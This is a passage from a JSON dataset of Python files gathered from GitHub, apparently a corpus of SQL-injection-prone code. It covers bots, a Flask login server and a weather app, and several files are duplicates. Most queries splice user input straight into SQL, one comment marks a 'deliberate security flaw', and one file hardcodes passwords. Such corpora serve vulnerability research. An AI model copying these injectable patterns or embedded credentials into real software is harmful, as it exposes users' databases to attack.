True\n                except AttributeError:\n                    pass\n            if not alreadyPosted and getSeriesDateFromDatabase(submission) <= getSubmissionDateFromDatabase(submission):\n                print(\"Replying to submission: \" + str(submission.id) + \" in series: \" + str(getTitle(submission)))\n                replyTrackedStats(submission)\n\n    database.close()\n\n# Reply to a post which has tracking enabled with the statistics of the series up until that post excluding itself\ndef replyTrackedStats(submission):\n\n    table = getRankingsFromDatabase(submission)\n    text = \"\"\n    place = 0\n    for index, row in enumerate(table):\n        #print(row)\n        if index != 0:\n            if table[index][1] != table[index - 1][1] or table[index][2] != table[index - 1][2] or table[index][3] != table[index - 1][3]:\n                place = index\n\n        text += str(place + 1) + getPostFix(place + 1)\n        for i, val in enumerate(row):\n            if i == 0:\n                text += '|/u/' + str(val)\n            else:\n                text += '|' + str(val)\n        text += '\\n'\n\n    url = createAndUploadPlots(table, submission.id)\n\n    gameCount = getGameCountInSeriesSoFar(submission)\n\n    #submission.reply\n    print(\"I have found \" + str(gameCount) + \" challenges in this series so far:\\n\\nRanking|User|1st|2nd|3rd\\n:--|:--|:--|:--|:--\\n\" + \n        text + \"\\n\\n[Here](\" + \n        url + \") is a visualization of the current stats.\\n\\n---\\n\\n^(I'm a bot, message the author: /u/LiquidProgrammer if I made a mistake.) ^[Usage](https://www.reddit.com/r/geoguessr/comments/6haay2/).\")\n\n# Get the postfix st, nd, rd or th for a number\ndef getPostFix(index):\n    if index % 10 == 1 and index % 100 != 11:\n        return 'st'\n    if index % 10 == 2 and index % 100 != 12:\n        return 'nd'\n    if index % 10 == 3 and index % 100 != 13:\n        return 'rd'\n    else:\n        return 'th'\n\n# Count the number of games in a series up until that post\ndef getGameCountInSeriesSoFar(submission):\n    database = sqlite3.connect('database.db')\n    cursor = database.cursor()\n    return cursor.execute(\"SELECT COUNT(*) FROM ChallengeRankings WHERE SeriesTitle = '\" + getTitle(submission) + \"' AND Date <= '\" + getSubmissionDateFromDatabase(submission) + \"'\").fetchone()[0]\n    database.close()\n\ndef getSeriesDateFromDatabase(submission):\n    database = sqlite3.connect('database.db')\n    cursor = database.cursor()\n    return cursor.execute(\"SELECT StartDate FROM SeriesTracking WHERE SeriesTitle = '\" + str(getTitle(submission)) + \"'\").fetchone()[0]\n    database.close()\n\ndef getSubmissionDateFromDatabase(submission):\n    database = sqlite3.connect('database.db')\n    cursor = database.cursor()\n    return cursor.execute(\"SELECT Date FROM ChallengeRankings WHERE SubmissionID = '\" + str(submission.id) + \"'\").fetchone()[0]\n    database.close()\n\nif __name__ == '__main__':\n    checkNewSubmissions()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LiquidFun/Reddit-GeoGuessr-Tracking-Bot/blob/5559fa5c1a56ac602b34d8b8fbccea7f4c133770",
        "file_path": "/CreateTableFromDatabase.py",
        "source": "import sqlite3\nimport operator\nfrom AddScoresToDatabase import getTitle\nfrom AddScoresToDatabase import getDate\nfrom InitDatabase import getRedditInstance\n\n# Create a table with the rankings from the local database for a series up until a specific submission excluding that submission\ndef getRankingsFromDatabase(submission):\n    \n    # Connect to database\n    database = sqlite3.connect(\"database.db\")\n    cursor = database.cursor()\n\n    # Create a set with all the usernames in that series\n    nameSet = set()\n    for row in cursor.execute(\"SELECT Place1, Place2, Place3 FROM ChallengeRankings WHERE SeriesTitle = '\" + getTitle(submission) + \"' AND Date < '\" + str(getDate(submission)) + \"'\"):\n        for val in row:\n            if val is not '':\n                for author in val.split('|'):\n                    nameSet.add(author)\n                \n    nameList = [name for name in nameSet]\n\n    table = [[name, 0, 0, 0] for name in nameList]\n\n    # Iterate through every post in the series and increment the winners in the table\n    for i in range(1, 4):\n        for row in cursor.execute(\"SELECT Place\" + str(i) + \" FROM ChallengeRankings WHERE SeriesTitle = '\" + getTitle(submission) + \"' AND Date < '\" + str(getDate(submission)) + \"'\"):\n            for val in row:\n                if val is not '':\n                    for author in val.split('|'):\n                        table[nameList.index(author)][i] += 1\n\n    table.sort(reverse = True, key = operator.itemgetter(1, 2, 3))\n\n    database.close()\n\n    #print(table)\n    return table\n\nif __name__ == '__main__':\n    reddit = getRedditInstance()\n    print(getRankingsFromDatabase(reddit.submission(id = '6haay2')))",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jgayfer/spirit/blob/dc1662c6c747387c392bedda5dd88f43e73f5b1a",
        "file_path": "/db/dbase.py",
        "source": "from utils.admin import load_credentials\nimport MySQLdb\nimport json\n\nclass DBase:\n\n    credentials = load_credentials()\n    dsn = (credentials[\"dbhost\"], credentials[\"dbuser\"],\n           credentials[\"dbpass\"], credentials[\"dbname\"])\n\n\n    def __init__(self):\n        self.conn = MySQLdb.connect(*self.dsn)\n        self.cur = self.conn.cursor()\n\n\n    def __enter__(self):\n        return DBase()\n\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if self.conn:\n            self.conn.close()\n\n\n    def get_roster(self, server_id):\n        sql = \"\"\"SELECT username, role\n                 FROM roles\n                 WHERE roles.server_id = {0};\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_roster(self, username, role, server_id):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO roles (username, server_id, role)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE role = '{2}';\n                      \"\"\".format(username, server_id, role))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def create_event(self, title, start_time, time_zone, server_id, description):\n        sql = \"\"\"INSERT INTO events (title, start_time, time_zone, server_id, description)\n                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')\n                 \"\"\".format(title, start_time, time_zone, server_id, description)\n        self.cur.execute(sql)\n        self.conn.commit()\n\n\n    def get_events(self, server_id):\n        sql = \"\"\"SELECT events.event_id as e, title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE events.server_id = {0}\n                 GROUP BY event_id, title, description, start_time, time_zone;\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_attendance(self, username, event_id, attending):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO user_event (username, event_id, attending)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE attending = '{2}';\n                      \"\"\".format(username, event_id, attending))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def get_event(self, event_id):\n        sql = \"\"\"SELECT title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE event_id = {0};\n                 \"\"\".format(event_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def delete_event(self, event_id):\n        sql = \"\"\"DELETE FROM events\n                 WHERE event_id = {0}\n                 \"\"\".format(event_id)\n        affected_count = self.cur.execute(sql)\n        self.conn.commit()\n        return affected_count\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ryan4638/spirit/blob/dc1662c6c747387c392bedda5dd88f43e73f5b1a",
        "file_path": "/db/dbase.py",
        "source": "from utils.admin import load_credentials\nimport MySQLdb\nimport json\n\nclass DBase:\n\n    credentials = load_credentials()\n    dsn = (credentials[\"dbhost\"], credentials[\"dbuser\"],\n           credentials[\"dbpass\"], credentials[\"dbname\"])\n\n\n    def __init__(self):\n        self.conn = MySQLdb.connect(*self.dsn)\n        self.cur = self.conn.cursor()\n\n\n    def __enter__(self):\n        return DBase()\n\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if self.conn:\n            self.conn.close()\n\n\n    def get_roster(self, server_id):\n        sql = \"\"\"SELECT username, role\n                 FROM roles\n                 WHERE roles.server_id = {0};\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_roster(self, username, role, server_id):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO roles (username, server_id, role)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE role = '{2}';\n                      \"\"\".format(username, server_id, role))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def create_event(self, title, start_time, time_zone, server_id, description):\n        sql = \"\"\"INSERT INTO events (title, start_time, time_zone, server_id, description)\n                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')\n                 \"\"\".format(title, start_time, time_zone, server_id, description)\n        self.cur.execute(sql)\n        self.conn.commit()\n\n\n    def get_events(self, server_id):\n        sql = \"\"\"SELECT events.event_id as e, title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE events.server_id = {0}\n                 GROUP BY event_id, title, description, start_time, time_zone;\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_attendance(self, username, event_id, attending):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO user_event (username, event_id, attending)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE attending = '{2}';\n                      \"\"\".format(username, event_id, attending))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def get_event(self, event_id):\n        sql = \"\"\"SELECT title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE event_id = {0};\n                 \"\"\".format(event_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def delete_event(self, event_id):\n        sql = \"\"\"DELETE FROM events\n                 WHERE event_id = {0}\n                 \"\"\".format(event_id)\n        affected_count = self.cur.execute(sql)\n        self.conn.commit()\n        return affected_count\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LSDicky/Destiny-2/blob/dc1662c6c747387c392bedda5dd88f43e73f5b1a",
        "file_path": "/db/dbase.py",
        "source": "from utils.admin import load_credentials\nimport MySQLdb\nimport json\n\nclass DBase:\n\n    credentials = load_credentials()\n    dsn = (credentials[\"dbhost\"], credentials[\"dbuser\"],\n           credentials[\"dbpass\"], credentials[\"dbname\"])\n\n\n    def __init__(self):\n        self.conn = MySQLdb.connect(*self.dsn)\n        self.cur = self.conn.cursor()\n\n\n    def __enter__(self):\n        return DBase()\n\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if self.conn:\n            self.conn.close()\n\n\n    def get_roster(self, server_id):\n        sql = \"\"\"SELECT username, role\n                 FROM roles\n                 WHERE roles.server_id = {0};\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_roster(self, username, role, server_id):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO roles (username, server_id, role)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE role = '{2}';\n                      \"\"\".format(username, server_id, role))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def create_event(self, title, start_time, time_zone, server_id, description):\n        sql = \"\"\"INSERT INTO events (title, start_time, time_zone, server_id, description)\n                 VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')\n                 \"\"\".format(title, start_time, time_zone, server_id, description)\n        self.cur.execute(sql)\n        self.conn.commit()\n\n\n    def get_events(self, server_id):\n        sql = \"\"\"SELECT events.event_id as e, title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event, events\n                   WHERE user_event.event_id = e\n                   AND events.server_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE events.server_id = {0}\n                 GROUP BY event_id, title, description, start_time, time_zone;\n                 \"\"\".format(server_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def update_attendance(self, username, event_id, attending):\n        sql = []\n        sql.append(\"\"\"INSERT INTO users (username)\n                      VALUES ('{0}')\n                      ON DUPLICATE KEY UPDATE username = '{0}';\n                      \"\"\".format(username))\n        sql.append(\"\"\"INSERT INTO user_event (username, event_id, attending)\n                      VALUES ('{0}', '{1}', '{2}')\n                      ON DUPLICATE KEY UPDATE attending = '{2}';\n                      \"\"\".format(username, event_id, attending))\n        for query in sql:\n            self.cur.execute(query)\n        self.conn.commit()\n\n\n    def get_event(self, event_id):\n        sql = \"\"\"SELECT title, description, start_time, time_zone, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 1)\n                   AS accepted, (\n                   SELECT GROUP_CONCAT(DISTINCT username)\n                   FROM user_event\n                   WHERE event_id = {0}\n                   AND user_event.attending = 0)\n                   AS declined\n                 FROM events\n                 WHERE event_id = {0};\n                 \"\"\".format(event_id)\n        self.cur.execute(sql)\n        return self.cur.fetchall()\n\n\n    def delete_event(self, event_id):\n        sql = \"\"\"DELETE FROM events\n                 WHERE event_id = {0}\n                 \"\"\".format(event_id)\n        affected_count = self.cur.execute(sql)\n        self.conn.commit()\n        return affected_count\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ZetaPhase/ChewSnap/blob/d775444b5a0df1d7287e8ccdd732b18279163cf7",
        "file_path": "/Server/chew_snap_server.py",
        "source": "from flask import Flask\nfrom flask import request\nimport ast\nimport sqlite3\nimport bcrypt\n\napp = Flask(__name__)\nDATABASE = \"chew_snap_database.db\"\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef hello():\n    #if request.method == \"GET\":\n    print \"someone said get\"\n    return \"What's up santosh\"\n    \n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef request_login():\n    print \"user requesting login\"\n    print str(request.form)\n    parameters = str(request.form)[22:]\n    parameters = parameters[:-9]\n    print parameters\n    dic = ast.literal_eval(parameters)\n    email = dic[\"email\"]\n    password = dic[\"password\"]\n    print (email)\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT * FROM users WHERE email='\"+email+\"'\")\n    user = c.fetchone()\n    print user\n    conn.close()\n    if(not user):\n        # user does not exist\n        return \"login_404_NOTFOUND\"\n    else:\n        # user does exist   \n        name = user[1]\n        email = user[2]\n        hashed = user[3]\n        hashed = hashed.encode('ascii', 'ignore') # mreencode the unicode hash\n        if(bcrypt.hashpw(password, hashed)==hashed): #check if password hash matches\n            return \"login_200_FOUND \" + name\n        else:\n            return \"login_201_INVALID\"\n\n@app.route(\"/signup\", methods=[\"GET\", \"POST\"])\ndef request_signup():\n    print \"user requesting signup\"\n    # print str(request.form)\n    parameters = str(request.form)[22:] #remove immutable dict tags\n    parameters = parameters[:-9]\n    print parameters\n    dic = ast.literal_eval(parameters)\n    name = dic[\"name\"]\n    email = dic[\"email\"]\n    password = dic[\"password\"]\n    print (name + \" \" + email)\n    hashed = bcrypt.hashpw(password, bcrypt.gensalt());\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT * FROM users WHERE email='\"+email+\"'\")\n    user = c.fetchone()\n    if(user != None):\n        return \"signup_409_USEREXISTS\"\n    else:\n        c.execute('SELECT COUNT(userid) FROM users')\n        count = c.fetchone()[0]\n        c.execute(\"INSERT INTO users VALUES(\"+str(count)+\", '\"+name+\"', '\"+email+\"', '\"+hashed+\"')\")\n        conn.commit()\n        conn.close()\n        return \"signup_200_OK\"\n\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=80)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dglozano/raspberryWeather/blob/92c95d68a85cc284c9726993f5dbd5b7dfb6ecb0",
        "file_path": "/weather_app.py",
        "source": "from sense_hat import SenseHat, ACTION_PRESSED, ACTION_HELD, ACTION_RELEASED\nfrom pattern_ctrl import PatternInputController\nfrom smtplib import SMTP, SMTPException\nimport time\nimport signal\nimport os\nimport mysql.connector\n\nclass WeatherApp():\n\n\tdef __init__(self):\n\t\tself.sense = SenseHat()\n\t\tself.pattern_ctrl = PatternInputController(self.sense)\n\t\tsignal.signal(signal.SIGINT, self.sigint_handler)\n\n\t\tself.sender = \"diegogarcialozano95@gmail.com\"\n\t\tself.pwd = \"weatherapp\"\n\n\t\tself.message = \"From: From Raspberry Weather App <diegogarcialozano95@gmail.com>\"\n\t\tself.message += \"\\nTo: To {username} <{usermail}>\"\n\t\tself.message += \"\\nSubject: Weather App Report\\n\"\n\t\tself.message += \"\\n Hello {username1} ! Here is the weather data that was recorded:\\n\"\n\t\tself.message += \"\\n Temperature: {temp:.2f} Celsius\"\n\t\tself.message += \"\\n Pressure: {press:.2f} Milibars\"\n\t\tself.message += \"\\n Humidity: {humid:.2f} %\"\n\t\tself.message += \"\\n\\n Next report will be in {wait} seconds\"\n\n\t\twhile True:\n\t\t\tos.system(\"clear\")\n\t\t\tself.sense.clear()\n\t\t\tprint \"Enter your Username and then your pattern in the Raspberry Pi\"\n\t\t\tprint \"Type 'exit' to close \\n\"\n\t\t\t\n\t\t\tusername = raw_input(\"Username: \")\n\t\t\tif username == \"exit\":\n\t\t\t\tprint \"\\nBye!!\"\n\t\t\t\tself.sense.show_message(\"Bye!!\")\n\t\t\t\tbreak\n\t\t\tprint \"\\nEnter your authentication pattern in the Raspberry Pi\"\n\t\t\tprint \"\\n  - Move the joystick to move around\"\n\t\t\tprint \"\\n  - Push the joystick to select/deselect\"\n\t\t\tprint \"\\n  - Press any place along the green lines to submit\"\n\t\t\tpattern = self.pattern_ctrl.get_input_pattern()\n\t\t\tpattern = self.pattern_to_string(pattern)\n\t\t\ttry:\n\t\t\t\tself.login(username,pattern)\n\t\t\t\tself.sense.load_image(\"res/success.png\")\n\t\t\t\tprint \"\\n\\nWelcome \" + self.user_logged['name'] + \" !\"\n\t\t\t\tprint \"\\nPress Ctrl + C to  logout\"\n\t\t\t\ttime.sleep(2)\n\t\t\t\tself.sense.clear()\n\t\t\t\tself.record_weather()\n\t\t\texcept Exception as error:\n\t\t\t\tself.sense.load_image(\"res/error.png\")\n\t\t\t\tprint \"\\nAn error has occured:\\n\"\n\t\t\t\tprint error\n\t\t\t\tprint \"\\nPress Enter to continue\"\n\t\t\t\traw_input()\t\t\t\t\n\t\t\t\tself.sense.clear()\n\t\t\n\tdef send_mail(self,t,p,h):\n\t\ttry:\n\t\t\tself.smtp = SMTP(\"smtp.gmail.com:587\")\n\t\t\tself.smtp.ehlo()\n\t\t\tself.smtp.starttls()\n\t\t\tself.smtp.login(self.sender, self.pwd)\n\t\t\tself.message = self.message.format(username=self.user_logged['name'],\n\t\t\t\t\t    usermail=self.user_logged['mail'],\n\t\t\t\t\t    username1=self.user_logged['name'],\n\t\t\t\t\t    temp = t,\n\t\t\t\t\t    press = p,\n\t\t\t\t\t    humid = h,\n\t\t\t\t\t    wait = self.user_logged['wait'])\n\t\t\tself.smtp.sendmail(self.sender, [self.user_logged['mail']], self.message)\n\t\t\tself.smtp.quit()\n\t\texcept SMTPException:\n\t\t\tprint \"Error: unable to send email\"\n\n\tdef record_weather(self):\n\t\tself.logout = False\n\t\twhile self.logout == False:\n\t\t\ttimer = 0\n\n\t\t\ttemperature = self.sense.get_temperature()\n\t\t\tpressure = self.sense.get_humidity()\n\t\t\thumidity = self.sense.get_pressure()\n\n\t\t\tself.send_mail(temperature,pressure,humidity)\n\n\t\t\twhile self.logout == False and timer < self.user_logged['wait']:\n\t\t\t\tself.animation()\n\t\t\t\ttimer += 1\n\t\tself.logout = False\n\t\t\t\n\tdef animation(self):\n\t\t\"One second animation\"\n\t\tself.sense.load_image(\"res/cloud1.png\")\n\t\ttime.sleep(0.25)\n\t\tself.sense.load_image(\"res/cloud2.png\")\n\t\ttime.sleep(0.25)\n\t\tself.sense.load_image(\"res/cloud3.png\")\n\t\ttime.sleep(0.25)\n\t\tself.sense.load_image(\"res/cloud4.png\")\n\t\ttime.sleep(0.25)\n\n\tdef sigint_handler(self, signum, frame):\n\t\tself.logout = True\n\n\tdef pattern_to_string(self, pattern):\n\t\tfor i in range(len(pattern)):\n\t\t\tpattern[i] = \"Y\" if pattern[i] == True else \"N\"\n\t\treturn ''.join(pattern)\n\n\tdef login(self, username, pattern):\n\t\tcnx = mysql.connector.connect(user='root', password='p@ssword',host='127.0.0.1',database='weather_app')\n\t\tquery = (\"SELECT name,email,record_time FROM users WHERE users.name = '{}' AND users.pattern = '{}';\".format(username,pattern))\n\t\tcursor = cnx.cursor()\n\t\tcursor.execute(query)\n\t\tresult = []\n\t\tfor row in cursor:\n\t\t\tresult.append(row)\n\t\tcursor.close()\n\t\tcnx.close()\n\t\tif len(result) > 0:\n\t\t\tself.user_logged = { 'name': result[0][0],\n\t\t\t\t\t     'mail': result[0][1],\n\t\t\t\t\t     'wait': result[0][2] }\n\t\telse:\n\t\t\traise Exception(\"User not found\")\n\t\t\nif __name__ == \"__main__\":\n\tweather_app = WeatherApp()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Marundu/crimemap/blob/57519c087ef077afa0d4bf9e092341fca2f12c1e",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper:\n\tdef connect(self, database='crimemap'):\n\t\treturn pymysql.connect(host='localhost', user=dbconfig.db_user, password=dbconfig.db_password, db=database)\n\n\tdef get_all_inputs(self):\n\t\tconnection=self.connect()\n\t\ttry:\n\t\t\tquery='SELECT description FROM crimes;'\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\treturn cursor.fetchall()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef add_input(self, data):\n\t\tconnection=self.connect()\n\t\ttry:\n\t\t\t# The following introduces a deliberate security flaw\n\t\t\tquery=\"INSERT INTO crimes (description) VALUES('{}');\".format(data)\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef clear_all(self):\n\t\tconnection=self.connect()\n\t\ttry:\n\t\t\tquery='DELETE FROM crimes;'\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hhucn/netsec-uebungssystem/blob/372bfd3120fdf1a9b450b8ed0339bca1dee33482",
        "file_path": "/netsecus/submission.py",
        "source": "from __future__ import unicode_literals\n\nimport collections\nimport datetime\nimport hashlib\nimport itertools\nimport os.path\nimport re\nimport time\n\nfrom . import (\n    commands,\n    helper,\n    sheet,\n    student,\n    sendmail,\n)\n\nSubmission = collections.namedtuple(\n    'Submission',\n    ['id', 'sheet_id', 'student_id', 'time', 'files_path', 'deleted'])\n\n\ndef _match_subject(subject):\n    return re.match(r'^Abgabe\\s*(?P<id>[0-9]+)', subject)\n\n\ndef sheet_by_mail(db, uid, message):\n    subject = helper.get_header(message, 'Subject', '')\n    sheet_m = _match_subject(subject)\n    if not sheet_m:\n        raise helper.MailError(uid, 'Invalid subject line, found: %s' % subject)\n    sheet_id_str = sheet_m.group('id')\n    assert re.match(r'^[0-9]+$', sheet_id_str)\n    sheet_id = int(sheet_id_str)\n\n    res = sheet.get_by_id(db, sheet_id)\n    if not res:\n        raise helper.MailError(uid, 'Could not find a sheet with id %s' % sheet_id)\n    return res\n\n\ndef create(db, sheet_id, student_id, timestamp, files_path, deleted=0):\n    db.cursor.execute(\n        \"\"\"INSERT INTO submission\n            (sheet_id, student_id, time, files_path, deleted)\n            VALUES (?, ?, ?, ?, ?)\"\"\",\n        (sheet_id, student_id, timestamp, files_path, deleted)\n    )\n    submission_id = db.cursor.lastrowid\n    db.database.commit()\n    return Submission(submission_id, sheet_id, student_id, timestamp, files_path, 0)\n\n\ndef add_file(self, submission_id, hash, filename, size):\n    self.cursor.execute(\n        \"\"\"INSERT INTO file (submission_id, hash, filename, size)\n           VALUES(?, ?, ?, ?)\"\"\", (submission_id, hash, filename, size))\n    self.database.commit()\n\n\ndef handle_mail(config, db, imapmail, uid, message):\n    subject = helper.get_header(message, 'Subject', '(none)')\n    if not _match_subject(subject):\n        return  # Interactive mail, we don't care about those\n\n    alias = message.get('From', 'anonymous')\n    try:\n        stu = student.resolve_alias(db, alias)\n        sheet = sheet_by_mail(db, uid, message)\n\n        now_ts = time.time()\n        now_dt = datetime.datetime.fromtimestamp(now_ts)\n        now_str = now_dt.strftime('%Y-%m-%d_%H-%M-%S_%f')\n\n        files_path = os.path.join(\n            config(\"attachment_path\"),\n            helper.escape_filename(str(stu.id)),\n            helper.escape_filename(str(sheet.id)),\n            helper.escape_filename(now_str)\n        )\n        if os.path.exists(files_path):\n            orig_files_path = files_path\n            for i in itertools.count(2):\n                files_path = '%s___%s' % (orig_files_path, i)\n                if not os.path.exists(files_path):\n                    break\n\n        subm = create(db, sheet.id, stu.id, int(now_ts), files_path)\n\n        mailtext = b\"\"\n\n        os.makedirs(files_path)\n        for subpart in message.walk():\n            fn = subpart.get_filename()\n            payload = subpart.get_payload(decode=True)\n\n            if not payload:\n                continue\n\n            if fn:\n                # file part\n                payload_name = helper.escape_filename(fn)\n                payload_path = os.path.join(files_path, payload_name)\n                payload_size = len(payload)\n                hash_str = 'sha256-%s' % hashlib.sha256(payload).hexdigest()\n                with open(payload_path, \"wb\") as payload_file:\n                    payload_file.write(payload)\n\n                add_file(db, subm.id, hash_str, payload_name, payload_size)\n            else:\n                # message part\n                if mailtext:\n                    mailtext += b\"\\n\\n--- Part ---\\n\"\n                mailtext += payload\n\n        if mailtext:\n            # write \"mail\" file\n            payload_path = os.path.join(files_path, \"mail\")\n            payload_size = len(mailtext)\n            hash_str = 'sha256-%s' % hashlib.sha256(mailtext).hexdigest()\n            with open(payload_path, \"wb\") as payload_file:\n                payload_file.write(mailtext)\n\n            add_file(db, subm.id, hash_str, \"mail\", payload_size)\n\n        commands.move(config, imapmail, uid, \"Abgaben\")\n\n        sendmail.send_template(config, alias, \"Mail erhalten: %s\" % subject, \"mail_received.html\")\n    except helper.MailError as me:\n        sendmail.send_template(config, alias, \"Mail fehlerhaft: %s\" % subject, \"mail_sheet_not_found.html\")\n        raise me\n\n\ndef get_for_student(db, student_id):\n    db.cursor.execute(\n        \"\"\"SELECT id, sheet_id, student_id, time, files_path, deleted\n           FROM submission WHERE student_id = ?\"\"\", (student_id,))\n    rows = db.cursor.fetchall()\n    return [Submission(*row) for row in rows]\n\n\ndef get_all(db):\n    db.cursor.execute(\n        \"\"\"SELECT id, sheet_id, student_id, time, files_path, deleted\n           FROM submission WHERE deleted IS NOT 1\"\"\")\n    rows = db.cursor.fetchall()\n    return [Submission(*row) for row in rows]\n\n\ndef get_full_by_id(db, id):\n    return get_full_sql(db, \"submission.id = %s\" % id)[0]\n\n\ndef get_all_full(db):\n    return get_full_sql(db, \"\")\n\n\ndef get_full_sql(db, filter):\n    db.cursor.execute(\"\"\"SELECT\n                         submission.id,\n                         submission.sheet_id,\n                         submission.student_id,\n                         submission.time,\n                         submission.files_path,\n                         student.primary_alias,\n                         grading_result.grader,\n                         grading_result.decipoints,\n                         grading_result.status\n                         FROM\n                         submission\n                         INNER JOIN student ON\n                         submission.student_id = student.id\n                         AND student.deleted IS NOT 1\n                         AND submission.deleted IS NOT 1\n                         %s\n                         LEFT OUTER JOIN grading_result ON\n                         submission.id = grading_result.submission_id\n                         ORDER BY submission.id DESC\n                         \"\"\" %\n                      (\" AND %s\" % filter if filter else \"\"))\n    rows = db.cursor.fetchall()\n\n    all_full = []\n\n    for row in rows:\n        id, sheet_id, student_id, time, files_path, primary_alias, grader, decipoints, status = row\n        